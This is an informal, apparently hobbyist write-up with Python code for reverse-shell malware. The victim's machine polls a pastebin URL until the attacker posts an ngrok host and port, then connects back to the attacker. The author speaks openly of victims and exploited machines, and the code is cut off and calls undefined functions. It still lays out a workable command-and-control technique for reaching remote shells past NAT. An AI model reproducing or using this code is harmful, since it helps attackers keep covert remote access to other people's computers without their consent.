@@ -1,0 +1,33 @@
+so okay ngrok is good but not if you dont use premium u have to keep the pc up and running all the time so one way you can bypass this is okay umm okay so lets say
+u use python so what you can do is setup a pastebin like this one i have https://pastebin.com/X0YHVVxc so that pastebin currently has the number 1 there so lets say in a reverse shell
+i need the exploited machine to connect to me but itll need a ngrok link so what we can do is lets say if we add a function that reads the pastebin every 20 or any amout of time . so if the pastebin has the letetr 1 it will keep running the cycle until the pastebin doesnt have the number 1 so when you want to connect to the victims pc you can like
+update the pastebin to the ngrok link and the victim's program will extract the link and connect
+so the clients program will be somethign like:
+def reboot():
+
+    fhand=urllib.request.urlopen("https://pastebin.com/raw/X0YHVVxc")
+    for line in fhand:
+        z=line.decode()
+
+    z=str(z)
+
+    print(z)
+
+
+    if z=="1":
+        paused()
+        reboot()
+
+    else:
+
+        REMOTE_HOST = z[6:20]
+        REMOTE_PORT=z[21:]
+        REMOTE_PORT=int(REMOTE_PORT)
+        print(REMOTE_PORT)
+        print("[-] Connection Initiating...")
+        try:
+            conn.connect((REMOTE_HOST, REMOTE_PORT))
+            print("[-] Connection initiated!")
+            lul()
+
+that is a very bad example but yea and the client's 
